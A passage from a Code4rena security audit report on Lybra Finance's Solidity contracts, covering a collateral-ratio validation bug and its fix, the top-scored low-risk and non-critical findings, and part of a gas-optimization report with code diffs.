<https://github.com/code-423n4/2023-06-lybra/blob/26915a826c90eeb829863ec3851c3c785800594b/contracts/lybra/configuration/LybraConfigurator.sol#L127> <br><https://github.com/code-423n4/2023-06-lybra/blob/26915a826c90eeb829863ec3851c3c785800594b/contracts/lybra/configuration/LybraConfigurator.sol#L202>

### Impact

The documentation states that:

- "The PeUSD vault requires a safe collateral rate at least 10% higher than the liquidation collateral rate, providing an additional buffer to protect against liquidation risks."

Hence, it is important to maintain the invariance between the relation of the safe collateral ratio (SCR) and the bad collateral ratio (BCR). Both functions `setSafeCollateralRatio` and `setBadCollateralRatio` at the `LybraConfigurator` contract run checks to ensure that the relation always holds.

The former is coded as:

```solidity
function setSafeCollateralRatio(address pool, uint256 newRatio) external checkRole(TIMELOCK) {
   if(IVault(pool).vaultType() == 0) {
      require(newRatio >= 160 * 1e18, "eUSD vault safe collateralRatio should more than 160%");
   } else {
      // @audit-ok SCR is always at least 10% greater than BCR.
      require(newRatio >= vaultBadCollateralRatio[pool] + 1e19, "PeUSD vault safe collateralRatio should more than bad collateralRatio");
     }

   vaultSafeCollateralRatio[pool] = newRatio;
   emit SafeCollateralRatioChanged(pool, newRatio);
}
```

The latter is coded as:

```solidity
function setBadCollateralRatio(address pool, uint256 newRatio) external onlyRole(DAO) {
  // @audit-issue BCR and SCR relationship is not enforced correctly.
  require(newRatio >= 130 * 1e18 && newRatio <= 150 * 1e18 && newRatio <= vaultSafeCollateralRatio[pool] + 1e19, "LNA");
  
  vaultBadCollateralRatio[pool] = newRatio;
  
  emit SafeCollateralRatioChanged(pool, newRatio);
}
```

We take only the logic clause related to the relationship between the BCR and SCR:

```solidity
require(newRatio <= vaultSafeCollateralRatio[pool] + 1e19);
```

We can see that the relationship is not coded correctly, we want the SCR always to be at least 10% higher than the BCR, so the correct check should be:

```solidity
require(newRatio <= vaultSafeCollateralRatio[pool] - 1e19);
```

### Proof of Concept

There is a path of actions that can lead to an SCR and a BCR that do not meet the requirement stated previously. For example:

1. SCR is set to 150%
2. BCR is also set to 150% (Incorrect requirement pass: 150% <= 150% + 10%)

### Tools Used

Manual Review

### Recommended Mitigation Steps

Change:

```solidity
require(newRatio >= 130 * 1e18 && newRatio <= 150 * 1e18 && newRatio <= vaultSafeCollateralRatio[pool] + 1e19, "LNA");
```

to:

```solidity
require(newRatio >= 130 * 1e18 && newRatio <= 150 * 1e18 && newRatio <= vaultSafeCollateralRatio[pool] - 1e19, "LNA");
```

### Assessed type

Invalid Validation

**[LybraFinance confirmed](https://github.com/code-423n4/2023-06-lybra-findings/issues/3#issuecomment-1639515404)**

***

# Low Risk and Non-Critical Issues

For this audit, 42 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2023-06-lybra-findings/issues/953) by **0xnev** received the top score from the judge.

*The following wardens also submitted reports: [halden](https://github.com/code-423n4/2023-06-lybra-findings/issues/932), [D_Auditor](https://github.com/code-423n4/2023-06-lybra-findings/issues/906), [bart1e](https://github.com/code-423n4/2023-06-lybra-findings/issues/763), [RedOneN](https://github.com/code-423n4/2023-06-lybra-findings/issues/741), [MrPotatoMagic](https://github.com/code-423n4/2023-06-lybra-findings/issues/729), [solsaver](https://github.com/code-423n4/2023-06-lybra-findings/issues/706), [squeaky_cactus](https://github.com/code-423n4/2023-06-lybra-findings/issues/688), [hals](https://github.com/code-423n4/2023-06-lybra-findings/issues/608), [0xnacho](https://github.com/code-423n4/2023-06-lybra-findings/issues/476), [0xRobocop](https://github.com/code-423n4/2023-06-lybra-findings/issues/378), [kutugu](https://github.com/code-423n4/2023-06-lybra-findings/issues/338), [bytes032](https://github.com/code-423n4/2023-06-lybra-findings/issues/291), [RedTiger](https://github.com/code-423n4/2023-06-lybra-findings/issues/260), [Sathish9098](https://github.com/code-423n4/2023-06-lybra-findings/issues/131), [HE1M](https://github.com/code-423n4/2023-06-lybra-findings/issues/107), [Rolezn](https://github.com/code-423n4/2023-06-lybra-findings/issues/80), [naman1778](https://github.com/code-423n4/2023-06-lybra-findings/issues/979), [devival](https://github.com/code-423n4/2023-06-lybra-findings/issues/960), [seth_lawson](https://github.com/code-423n4/2023-06-lybra-findings/issues/940), [SanketKogekar](https://github.com/code-423n4/2023-06-lybra-findings/issues/924), [nonseodion](https://github.com/code-423n4/2023-06-lybra-findings/issues/902), [m_Rassska](https://github.com/code-423n4/2023-06-lybra-findings/issues/887), [Toshii](https://github.com/code-423n4/2023-06-lybra-findings/issues/864), [0xkazim](https://github.com/code-423n4/2023-06-lybra-findings/issues/797), [3agle](https://github.com/code-423n4/2023-06-lybra-findings/issues/790), [codetilda](https://github.com/code-423n4/2023-06-lybra-findings/issues/772), [Iurii3](https://github.com/code-423n4/2023-06-lybra-findings/issues/698), [CrypticShepherd](https://github.com/code-423n4/2023-06-lybra-findings/issues/683), [0xbrett8571](https://github.com/code-423n4/2023-06-lybra-findings/issues/642), [yudan](https://github.com/code-423n4/2023-06-lybra-findings/issues/621), [ABAIKUNANBAEV](https://github.com/code-423n4/2023-06-lybra-findings/issues/620), [DelerRH](https://github.com/code-423n4/2023-06-lybra-findings/issues/496), [Kaysoft](https://github.com/code-423n4/2023-06-lybra-findings/issues/479), [Co0nan](https://github.com/code-423n4/2023-06-lybra-findings/issues/360), [Bauchibred](https://github.com/code-423n4/2023-06-lybra-findings/issues/296), [Timenov](https://github.com/code-423n4/2023-06-lybra-findings/issues/241), [y51r](https://github.com/code-423n4/2023-06-lybra-findings/issues/200), [Vagner](https://github.com/code-423n4/2023-06-lybra-findings/issues/182), [8olidity](https://github.com/code-423n4/2023-06-lybra-findings/issues/163), [zaevlad](https://github.com/code-423n4/2023-06-lybra-findings/issues/73), and [totomanov](https://github.com/code-423n4/2023-06-lybra-findings/issues/49).*

## Low Risk Summary
| Count | Title | 
|:--:|:-------|
| [L-01] | `liquidation()`: Liquidation allowance check insufficient in `liquidatio()`| 
| [L-02] |  `LybraGovernance`: Vote casters cannot change or remove vote | 
| [L-03] | `LybraEUSDVaultBase.superLiquidation()`: Confusing code comments deviates from function logic | 

| Total Low Risk Issues | 3 |
|:--:|:--:|

## Non-Critical Summary
| Count | Title | 
|:--:|:-------|
| [N-01] | `rigidRedemption()`: Disallow rigid redemption of 0 value| 
| [N-02] | Add reentrancy guard to Lybra's version of synthethix contract | 
| [N-03] | `LybraStETHVault.excessIncomeDistribution()`: Use `_saveReport()` directly |
| [N-04] | `LybraStETHVault.excessIncomeDistribution()`: Cache result of `getDutchAuctionDiscountPrice()` |
| [N-05] | `liquidation()/superLiquidation`: Add 0 value check to prevent division by 0 in `liquidation` |
| [N-06] | Superfluous events |


| Total Non-Critical Issues | 6 |
|:--:|:--:|

## Low Risk

## [L-01] `liquidation()`: Liquidation allowance check insufficient in `liquidatio()`

### Impact
```solidity
require(EUSD.allowance(provider, address(this)) > 0, "provider should authorize to provide liquidation EUSD");
```
Liquidation allowance check in `liquidation()` is insufficient since it only checks that allowance provided to vault contract is more than 0.

Provider should authorize to provide at least `eusdAmount` to repay on behalf of borrower that is under-collateralized in `liquidation()`, similar to `superLiquidation()`. If not, the transaction will still revert.

### Recommendation
Consider approving token allowance similar to `superLiquidation()`
```solidity
require(EUSD.allowance(provider, address(this)) >= eusdAmount, "provider should authorize to provide liquidation EUSD");
```

## [L-02] `LybraGovernance`: Vote casters cannot change or remove vote

### Impact
```solidity
function _countVote(uint256 proposalId, address account, uint8 support, uint256 weight, bytes memory) internal override {
    
    require(state(proposalId) == ProposalState.Active, "GovernorBravo::castVoteInternal: voting is closed");
    require(support <= 2, "GovernorBravo::castVoteInternal: invalid vote type");
    ProposalExtraData storage proposalExtraData = proposalData[proposalId];
    Receipt storage receipt = proposalExtraData.receipts[account];
    require(receipt.hasVoted == false, "GovernorBravo::castVoteInternal: voter already voted");
    
    proposalExtraData.supportVotes[support] += weight;
    

    receipt.hasVoted = true;
    receipt.support = support;
    receipt.votes = weight;
    proposalExtraData.totalVotes += weight;
    
}
```
In `_countVote()` total votes are added and never decremented, indicationg there is no mechanism/function for users to remove vote casted.

### Recommendation
Consider allowing removal of votes if `proposalState` is still active.

## [L-03] `LybraEUSDVaultBase.superLiquidation()`: Confusing code comments deviates from function logic

### Impact
```solidity
/**
    * @notice When overallCollateralRatio is below badCollateralRatio, borrowers with collateralRatio below 125% could be fully liquidated.
    * Emits a `LiquidationRecord` event.
    *
    * Requirements:
    * - Current overallCollateralRatio should be below badCollateralRatio
    * - `onBehalfOf`collateralRatio should be below 125%
    * @dev After Liquidation, borrower's debt is reduced by collateralAmount * etherPrice, deposit is reduced by collateralAmount * borrower's collateralRatio. Keeper gets a liquidation reward of `keeperRatio / borrower's collateralRatio
    */
function superLiquidation(address provider, address onBehalfOf, uint256 assetAmount) external virtual {
    uint256 assetPrice = getAssetPrice();
    require((totalDepositedAsset * assetPrice * 100) / poolTotalEUSDCirculation < badCollateralRatio, "overallCollateralRatio should below 150%");
    uint256 onBehalfOfCollateralRatio = (depositedAsset[onBehalfOf] * assetPrice * 100) / borrowed[onBehalfOf];
    require(onBehalfOfCollateralRatio < 125 * 1e18, "borrowers collateralRatio should below 125%");
    require(assetAmount <= depositedAsset[onBehalfOf], "total of collateral can be liquidated at most");
    uint256 eusdAmount = (assetAmount * assetPrice) / 1e18;
    if (onBehalfOfCollateralRatio >= 1e20) {
        eusdAmount = (eusdAmount * 1e20) / onBehalfOfCollateralRatio;
    }
    require(EUSD.allowance(provider, address(this)) >= eusdAmount, "provider should authorize to provide liquidation EUSD");

    _repay(provider, onBehalfOf, eusdAmount);

    totalDepositedAsset -= assetAmount;
    depositedAsset[onBehalfOf] -= assetAmount;
    uint256 reward2keeper;
    if (msg.sender != provider && onBehalfOfCollateralRatio >= 1e20 + configurator.vaultKeeperRatio(address(this)) * 1e18) {
        reward2keeper = ((assetAmount * configurator.vaultKeeperRatio(address(this))) * 1e18) / onBehalfOfCollateralRatio;
        collateralAsset.transfer(msg.sender, reward2keeper);
    }
    collateralAsset.transfer(provider, assetAmount - reward2keeper);

    emit LiquidationRecord(provider, msg.sender, onBehalfOf, eusdAmount, assetAmount, reward2keeper, true, block.timestamp);
}
```

In code comments of `superLiquidation()`, it is mentioned that deposit of borrower (collateral) will be reduced by collateral amount * borrower's collateral ratio. This is inaccurate, as the goal of `superLiquidation()` is to allow possible complete liquidation of borrower's collateral; hence, `totalDepositAsset` is simply subtracted by `assetAmount`.  

### Recommendation
Adjust code comments to follow function logic.

## Non-Critical

## [N-01] `rigidRedemption()`: Disallow rigid redemption of 0 value

Currently, `rigidRedemption` of 0 eUSD amount is allowed and won't revert. Consider adding zero value check for `eusdAmount` in `rigidRedemption`

## [N-02] Add reentrancy guard to Lybra's version of synthethix contract

The synthethix `Staking.sol` contract implements reentrancy guard `nonReentrant` for `stake()`, `withdraw()` and `getRewards()`. Consider adding reentrancy guard as well for additional protection against potential/possible reentrancies.

## [N-03] `LybraStETHVault.excessIncomeDistribution()`: Use `_saveReport()` directly

```solidity
uint256 income = feeStored + _newFee();
```

In `LybraStETHVault.excessIncomeDistribution()`, income calculated is distributed after fees are updated. This can simply be done by the already inherited function `_saveReport()` like the following. Also, since `lastReportTime` is also updated via `_saveReport()`, the update of `lastReportTime` within `excessIncomeDistribution()` can also be removed.

```solidity
uint256 income = _saveReport();
```
## [N-04] `LybraStETHVault.excessIncomeDistribution()`: Cache result of `getDutchAuctionDiscountPrice()`

```solidity
uint256 payAmount = (((realAmount * getAssetPrice()) / 1e18) * getDutchAuctionDiscountPrice()) / 10000;
```
```solidity
emit LSDValueCaptured(realAmount, payAmount, getDutchAuctionDiscountPrice(), block.timestamp);
```
Cache the result of `getDutchAuctionDiscountPrice()` since it is called twice in `excessIncomeDistribution()`, once for calculating `payAmount` and another time for emitting `LSDValueCaptured` event.

## [N-05] `liquidation()/superLiquidation`: Add 0 value check to prevent division by 0 in `liquidation`

```solidity
require(borrowerd[onBehalfOf] > 0, "Must have borrow balance")   
```
Consider adding a check to ensure that `borrowed` amount is greater than 0 before allowing for `liquidation()/superLiquidation` to prevent division by zero error.


## [N-06] Superfluous events

Many events in the contracts emit `block.timestamp`, which is not needed since it is included in every emission of events in solidity, so it is not needed to explicity emit them in events.

**[LybraFinance acknowledged](https://github.com/code-423n4/2023-06-lybra-findings/issues/953#issuecomment-1653016735)**

**[0xean (judge) commented](https://github.com/code-423n4/2023-06-lybra-findings/issues/953#issuecomment-1657182516):**
 > L-01 should be Non-Critical, as this is just about clarity - mostly or potentially gas savings for an early revert.
> 
> Otherwise, the severities look correct.

***

# Gas Optimizations

For this audit, 22 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2023-06-lybra-findings/issues/898) by **JCN** received the top score from the judge.

*The following wardens also submitted reports: [naman1778](https://github.com/code-423n4/2023-06-lybra-findings/issues/977), 
[SM3\_SS](https://github.com/code-423n4/2023-06-lybra-findings/issues/959), 
[Raihan](https://github.com/code-423n4/2023-06-lybra-findings/issues/957), 
[MohammedRizwan](https://github.com/code-423n4/2023-06-lybra-findings/issues/951), 
[fatherOfBlocks](https://github.com/code-423n4/2023-06-lybra-findings/issues/921), 
[mgf15](https://github.com/code-423n4/2023-06-lybra-findings/issues/897), 
[shamsulhaq123](https://github.com/code-423n4/2023-06-lybra-findings/issues/845), 
[ReyAdmirado](https://github.com/code-423n4/2023-06-lybra-findings/issues/830), 
[Rageur](https://github.com/code-423n4/2023-06-lybra-findings/issues/815), 
[SAQ](https://github.com/code-423n4/2023-06-lybra-findings/issues/781), 
[0xAnah](https://github.com/code-423n4/2023-06-lybra-findings/issues/742), 
[turvy\_fuzz](https://github.com/code-423n4/2023-06-lybra-findings/issues/565), 
[hunter\_w3b](https://github.com/code-423n4/2023-06-lybra-findings/issues/527), 
[SAAJ](https://github.com/code-423n4/2023-06-lybra-findings/issues/416), 
[mrudenko](https://github.com/code-423n4/2023-06-lybra-findings/issues/298), 
[Sathish9098](https://github.com/code-423n4/2023-06-lybra-findings/issues/130), 
[Rolezn](https://github.com/code-423n4/2023-06-lybra-findings/issues/102), 
[ayo\_dev](https://github.com/code-423n4/2023-06-lybra-findings/issues/84), 
[dharma09](https://github.com/code-423n4/2023-06-lybra-findings/issues/63), 
[DavidGiladi](https://github.com/code-423n4/2023-06-lybra-findings/issues/38), and
[souilos](https://github.com/code-423n4/2023-06-lybra-findings/issues/4).*

## Summary
The main objective of this report was to minimize storage operations. As such, gas optimizations that dealt with storage were prioritized to provide the most value when juxtaposed with the findings in the Bot Race. Since no tests are available and specific benchmarking is not possible, all optimizations are explained via EVM gas costs and opcodes.

*Notes*: 
- Only optimizations to state-mutating functions and `view`/`pure` function invoked by state-mutating functions are highlighted below.
- Only runtime gas is highlighted below, as it will inevitably out-weight deployment gas costs throughout the lifetime of the protocol.
- Some code snippets may be truncated to save space. Code snippets may also be accompanied by @audit tags in comments to aid in explaining the issue.

## Gas Optimizations Summary
| Number |Issue|Instances| Estimated Gas Saved |
|-|:-|:-:|:-:| 
| [G-01] | State variables can be cached instead of re-reading them from storage | 22 | 2200 |
| [G-02] | State variables only set during construction should be declared constant | 2 | 4200 |
| [G-03] | State variables can be packed into fewer storage slots | 5 | 22000 |
| [G-04] | Structs can be packed into fewer storage slots | 1 | 2000 |
| [G-05] | Cache state variables outside of loop to avoid reading storage on every iteration | 1 | 100 |
| [G-06] | Use `calldata` instead of `memory` for function parameters that don't change | 2 | 200 |
| [G-07] | Cache function calls | 5 | 600 |
| [G-08] | Refactor functions to avoid excessive storage reads | 4 | 900 |
| [G-09] | Avoid emitting event on every iteration | 1 | 375 |
| [G-10] | Multiple address/ID mappings can be combined into a single mapping of an address/ID to a struct, where appropriate | 1 | 22100 |

*Total Estimated Gas Saved: 54675*

## [G-01] State variables can be cached instead of re-reading them from storage
Caching of a state variable replaces each `Gwarmaccess (100 gas)` with a much cheaper stack read.

*Note: These are instances missed by the Bot Race.*

Total Instances: `22`

Estimated Gas Saved: `22 * 100 = 2200`

<details>

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L212-L214

### Cache `depositedAsset[_provider]` to save 1 SLOAD
```solidity
File: contracts/lybra/pools/base/LybraPeUSDVaultBase.sol
212:    function _withdraw(address _provider, address _onBehalfOf, uint256 _amount) internal {
213:        require(depositedAsset[_provider] >= _amount, "Withdraw amount exceeds deposited amount."); // @audit: 1st sload
214:        depositedAsset[_provider] -= _amount; // @audit: 2nd sload
```
```diff
diff --git a/lybra/pools/base/LybraPeUSDVaultBase.sol b/lybra/pools/base/LybraPeUSDVaultBase.sol
index 40c0421..b00a331 100644
--- a/lybra/pools/base/LybraPeUSDVaultBase.sol
+++ b/lybra/pools/base/LybraPeUSDVaultBase.sol
@@ -210,8 +210,9 @@ abstract contract LybraPeUSDVaultBase {
     }

     function _withdraw(address _provider, address _onBehalfOf, uint256 _amount) internal {
-        require(depositedAsset[_provider] >= _amount, "Withdraw amount exceeds deposited amount.");
-        depositedAsset[_provider] -= _amount;
+        uint256 _depositedAsset = depositedAsset[_provider];
+        require(_depositedAsset >= _amount, "Withdraw amount exceeds deposited amount.");
+        depositedAsset[_provider] = _depositedAsset -  _amount;
         collateralAsset.transfer(_onBehalfOf, _amount);
         if (getBorrowedOf(_provider) > 0) {
             _checkHealth(_provider, getAssetPrice());
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L161-L165

### Cache `depositedAsset[provider]` to save 1 SLOAD
```solidity
File: contracts/lybra/pools/base/LybraPeUSDVaultBase.sol
161:        uint256 providerCollateralRatio = (depositedAsset[provider] * assetPrice * 100) / borrowed[provider]; // @audit: 1st sload
162:        require(providerCollateralRatio >= 100 * 1e18, "provider's collateral ratio should more than 100%");
163:        _repay(msg.sender, provider, peusdAmount);
164:        uint256 collateralAmount = (((peusdAmount * 1e18) / assetPrice) * (10000 - configurator.redemptionFee())) / 10000;
165:        depositedAsset[provider] -= collateralAmount; // @audit: 2nd sload
```
```diff
diff --git a/lybra/pools/base/LybraPeUSDVaultBase.sol b/lybra/pools/base/LybraPeUSDVaultBase.sol
index 40c0421..d06e459 100644
--- a/lybra/pools/base/LybraPeUSDVaultBase.sol
+++ b/lybra/pools/base/LybraPeUSDVaultBase.sol
@@ -158,11 +158,12 @@ abstract contract LybraPeUSDVaultBase {
         require(configurator.isRedemptionProvider(provider), "provider is not a RedemptionProvider");
         require(borrowed[provider] >= peusdAmount, "peusdAmount cannot surpass providers debt");
         uint256 assetPrice = getAssetPrice();
-        uint256 providerCollateralRatio = (depositedAsset[provider] * assetPrice * 100) / borrowed[provider];
+        uint256 _depositedAsset = depositedAsset[provider];
+        uint256 providerCollateralRatio = (_depositedAsset * assetPrice * 100) / borrowed[provider];
         require(providerCollateralRatio >= 100 * 1e18, "provider's collateral ratio should more than 100%");
         _repay(msg.sender, provider, peusdAmount);
         uint256 collateralAmount = (((peusdAmount * 1e18) / assetPrice) * (10000 - configurator.redemptionFee())) / 10000;
-        depositedAsset[provider] -= collateralAmount;
+        depositedAsset[provider] = _depositedAsset - collateralAmount;
         collateralAsset.transfer(msg.sender, collateralAmount);
         emit RigidRedemption(msg.sender, provider, peusdAmount, collateralAmount, block.timestamp);
     }
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L127-L136

### Cache `depositedAsset[onBehalfOf]` to save 2 SLOADs
```solidity
File: contracts/lybra/pools/base/LybraPeUSDVaultBase.sol
127:        uint256 onBehalfOfCollateralRatio = (depositedAsset[onBehalfOf] * assetPrice * 100) / getBorrowedOf(onBehalfOf); // @audit: 1st sload
128:        require(onBehalfOfCollateralRatio < configurator.getBadCollateralRatio(address(this)), "Borrowers collateral ratio should below badCollateralRatio");
129:
130:        require(assetAmount * 2 <= depositedAsset[onBehalfOf], "a max of 50% collateral can be liquidated"); // @audit: 2nd sload
131:        require(PeUSD.allowance(provider, address(this)) > 0, "provider should authorize to provide liquidation EUSD");
132:        uint256 peusdAmount = (assetAmount * assetPrice) / 1e18;
133:
134:        _repay(provider, onBehalfOf, peusdAmount);
135:        uint256 reducedAsset = (assetAmount * 11) / 10;
136:        depositedAsset[onBehalfOf] -= reducedAsset; // @audit: 3rd sload
```
```diff
diff --git a/lybra/pools/base/LybraPeUSDVaultBase.sol b/lybra/pools/base/LybraPeUSDVaultBase.sol
index 40c0421..5b132fd 100644
--- a/lybra/pools/base/LybraPeUSDVaultBase.sol
+++ b/lybra/pools/base/LybraPeUSDVaultBase.sol
@@ -124,16 +124,17 @@ abstract contract LybraPeUSDVaultBase {
      */
     function liquidation(address provider, address onBehalfOf, uint256 assetAmount) external virtual {
         uint256 assetPrice = getAssetPrice();
-        uint256 onBehalfOfCollateralRatio = (depositedAsset[onBehalfOf] * assetPrice * 100) / getBorrowedOf(onBehalfOf);
+        uint256 _depositedAsset = depositedAsset[onBehalfOf];
+        uint256 onBehalfOfCollateralRatio = (_depositedAsset * assetPrice * 100) / getBorrowedOf(onBehalfOf);
         require(onBehalfOfCollateralRatio < configurator.getBadCollateralRatio(address(this)), "Borrowers collateral ratio should below badCollateralRatio");

-        require(assetAmount * 2 <= depositedAsset[onBehalfOf], "a max of 50% collateral can be liquidated");
+        require(assetAmount * 2 <= _depositedAsset, "a max of 50% collateral can be liquidated");
         require(PeUSD.allowance(provider, address(this)) > 0, "provider should authorize to provide liquidation EUSD");
         uint256 peusdAmount = (assetAmount * assetPrice) / 1e18;

         _repay(provider, onBehalfOf, peusdAmount);
         uint256 reducedAsset = (assetAmount * 11) / 10;
-        depositedAsset[onBehalfOf] -= reducedAsset;
+        depositedAsset[onBehalfOf] = _depositedAsset - reducedAsset;
         uint256 reward2keeper;
         if (provider == msg.sender) {
             collateralAsset.transfer(msg.sender, reducedAsset);
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraPeUSDVaultBase.sol#L174-L182

### Cache `poolTotalPeUSDCirculation` to save 1 SLOAD
```solidity
File: contracts/lybra/pools/base/LybraPeUSDVaultBase.sol
174:        require(poolTotalPeUSDCirculation + _mintAmount <= configurator.mintVaultMaxSupply(address(this)), "ESL"); // @audit: 1st sload
175:        _updateFee(_provider);
176:
177:        try configurator.refreshMintReward(_provider) {} catch {}
178:
179:        borrowed[_provider] += _mintAmount;
180:
181:        PeUSD.mint(_onBehalfOf, _mintAmount);
182:        poolTotalPeUSDCirculation += _mintAmount; // @audit: 2nd sload
```
```diff
diff --git a/lybra/pools/base/LybraPeUSDVaultBase.sol b/lybra/pools/base/LybraPeUSDVaultBase.sol
index 40c0421..91953be 100644
--- a/lybra/pools/base/LybraPeUSDVaultBase.sol
+++ b/lybra/pools/base/LybraPeUSDVaultBase.sol
@@ -171,7 +171,8 @@ abstract contract LybraPeUSDVaultBase {
      * @dev Refresh LBR reward before adding providers debt. Refresh Lybra generated service fee before adding totalSupply. Check providers collateralRatio cannot below `safeCollateralRatio`after minting.
      */
     function _mintPeUSD(address _provider, address _onBehalfOf, uint256 _mintAmount, uint256 _assetPrice) internal virtual {
-        require(poolTotalPeUSDCirculation + _mintAmount <= configurator.mintVaultMaxSupply(address(this)), "ESL");
+        uint256 _poolTotalPeUSDCirculation = poolTotalPeUSDCirculation;
+        require(_poolTotalPeUSDCirculation + _mintAmount <= configurator.mintVaultMaxSupply(address(this)), "ESL");
         _updateFee(_provider);

         try configurator.refreshMintReward(_provider) {} catch {}
@@ -179,7 +180,7 @@ abstract contract LybraPeUSDVaultBase {
         borrowed[_provider] += _mintAmount;

         PeUSD.mint(_onBehalfOf, _mintAmount);
-        poolTotalPeUSDCirculation += _mintAmount;
+        poolTotalPeUSDCirculation = _poolTotalPeUSDCirculation + _mintAmount;
         _checkHealth(_provider, _assetPrice);
         emit Mint(_provider, _onBehalfOf, _mintAmount, block.timestamp);
     }
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L260-L266

### Cache `poolTotalEUSDCirculation` to save 1 SLOAD
```solidity
File: contracts/lybra/pools/base/LybraEUSDVaultBase.sol
260:        require(poolTotalEUSDCirculation + _mintAmount <= configurator.mintVaultMaxSupply(address(this)), "ESL"); // @audit: 1st sload
261:        try configurator.refreshMintReward(_provider) {} catch {}
262:        borrowed[_provider] += _mintAmount;
263:
264:        EUSD.mint(_onBehalfOf, _mintAmount);
265:        _saveReport();
266:        poolTotalEUSDCirculation += _mintAmount; // @audit: 2nd sload
```
```diff
diff --git a/lybra/pools/base/LybraEUSDVaultBase.sol b/lybra/pools/base/LybraEUSDVaultBase.sol
index 7a8c439..233857c 100644
--- a/lybra/pools/base/LybraEUSDVaultBase.sol
+++ b/lybra/pools/base/LybraEUSDVaultBase.sol
@@ -257,13 +257,14 @@ abstract contract LybraEUSDVaultBase {
      * The provider must have sufficient borrowing capacity to mint the specified amount.
      */
     function _mintEUSD(address _provider, address _onBehalfOf, uint256 _mintAmount, uint256 _assetPrice) internal virtual {
-        require(poolTotalEUSDCirculation + _mintAmount <= configurator.mintVaultMaxSupply(address(this)), "ESL");
+        uint256 _poolTotalEUSDCirculation = poolTotalEUSDCirculation;
+        require(_poolTotalEUSDCirculation + _mintAmount <= configurator.mintVaultMaxSupply(address(this)), "ESL");
         try configurator.refreshMintReward(_provider) {} catch {}
         borrowed[_provider] += _mintAmount;

         EUSD.mint(_onBehalfOf, _mintAmount);
         _saveReport();
-        poolTotalEUSDCirculation += _mintAmount;
+        poolTotalEUSDCirculation = _poolTotalEUSDCirculation + _mintAmount;
         _checkHealth(_provider, _assetPrice);
         emit Mint(msg.sender, _onBehalfOf, _mintAmount, block.timestamp);
     }
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L277-L282

### Cache `borrowed[_onBehalfOf]` to save 1 SLOAD
```solidity
File: contracts/lybra/pools/base/LybraEUSDVaultBase.sol
277:        uint256 amount = borrowed[_onBehalfOf] >= _amount ? _amount : borrowed[_onBehalfOf]; // @audit: 1st sload
278:
279:        EUSD.burn(_provider, amount);
280:        try configurator.refreshMintReward(_onBehalfOf) {} catch {}
281:
282:        borrowed[_onBehalfOf] -= amount; // @audit: 2nd sload
```
```diff
diff --git a/lybra/pools/base/LybraEUSDVaultBase.sol b/lybra/pools/base/LybraEUSDVaultBase.sol
index 7a8c439..d0daf55 100644
--- a/lybra/pools/base/LybraEUSDVaultBase.sol
+++ b/lybra/pools/base/LybraEUSDVaultBase.sol
@@ -274,12 +274,13 @@ abstract contract LybraEUSDVaultBase {
      * @dev Refresh LBR reward before reducing providers debt. Refresh Lybra generated service fee before reducing totalEUSDCirculation.
      */
     function _repay(address _provider, address _onBehalfOf, uint256 _amount) internal virtual {
-        uint256 amount = borrowed[_onBehalfOf] >= _amount ? _amount : borrowed[_onBehalfOf];
+        uint256 _borrowed = borrowed[_onBehalfOf];
+        uint256 amount = _borrowed >= _amount ? _amount : _borrowed;

         EUSD.burn(_provider, amount);
         try configurator.refreshMintReward(_onBehalfOf) {} catch {}

-        borrowed[_onBehalfOf] -= amount;
+        borrowed[_onBehalfOf] = _borrowed - amount;
         _saveReport();
         poolTotalEUSDCirculation -= amount;
         emit Burn(_provider, _onBehalfOf, amount, block.timestamp);
```

https://github.com/code-423n4/2023-06-lybra/blob/main/contracts/lybra/pools/base/LybraEUSDVaultBase.sol#L234-L240

### Cache `borrowed[provider]` and `depositedAsset[provider]` to save 2 SLOADs
```solidity
File: contracts/lybra/pools/base/LybraEUSDVaultBase.sol
234:        require(borrowed[provider] >= eusdAmount, "eusdAmount cannot surpass providers debt"); // @audit: 1st sload
235:        uint256 assetPrice = getAssetPrice();
236:        uint256 providerCollateralRatio = (depositedAsset[provider] * assetPrice * 100) / borrowed[provider]; // @audit: 1st sload & 2nd sload
237:        require(providerCollateralRatio >= 100 * 1e18, "provider's collateral ratio should more than 100%");
238:        _repay(msg.sender, provider, eusdAmount);
239:        uint256 collateralAmount = (((eusdAmount * 1e18) / assetPrice) * (10000 - configurator.redemptionFee())) / 10000;
240:        depositedAsset[provider] -= collateralAmount; // @audit: 2nd sload
```
```diff
diff --git a/lybra/pools/base/LybraEUSDVaultBase.sol b/lybra/pools/base/LybraEUSDVaultBase.sol
index 7a8c439..c5ff16e 100644
--- a/lybra/pools/base/LybraEUSDVaultBase.sol
+++ b/lybra/pools/base/LybraEUSDVaultBase.sol
@@ -231,13 +231,15 @@ abstract contract LybraEUSDVaultBase {
      */
     function rigidRedemption(address provider, uint256 eusdAmount) external virtual {
         require(configurator.isRedemptionProvider(provider), "provider is not a RedemptionProvider");
-        require(borrowed[provider] >= eusdAmount, "eusdAmount cannot surpass providers debt");
+        uint256 _borrowed = borrowed[provider];
+        require(_borrowed >= eusdAmount, "eusdAmount cannot surpass providers debt");
         uint256 assetPrice = getAssetPrice();
-        uint256 providerCollateralRatio = (depositedAsset[provider] * assetPrice * 100) / borrowed[provider];
+        uint256 _depositedAsset = depositedAsset[provider];
+        uint256 providerCollateralRatio = (_depositedAsset * assetPrice * 100) / _borrowed;
         require(providerCollateralRatio >= 100 * 1e18, "provider's collateral ratio should more than 100%");
         _repay(msg.sender, provider, eusdAmount);
         uint256 collateralAmount = (((eusdAmount * 1e18) / assetPrice) * (10000 - configurator.redemptionFee())) / 10000;
-        depositedAsset[provider] -= collateralAmount;
+        depositedAsset[provider] = _depositedAsset - collateralAmount;
         totalDepositedAsset -= collateralAmount;
         collateralAsset.transfer(msg.sender, collateralAmount);
         emit RigidRedemption(msg.sender, provider, eusdAmount, collateralAmount, block.timestamp);
```

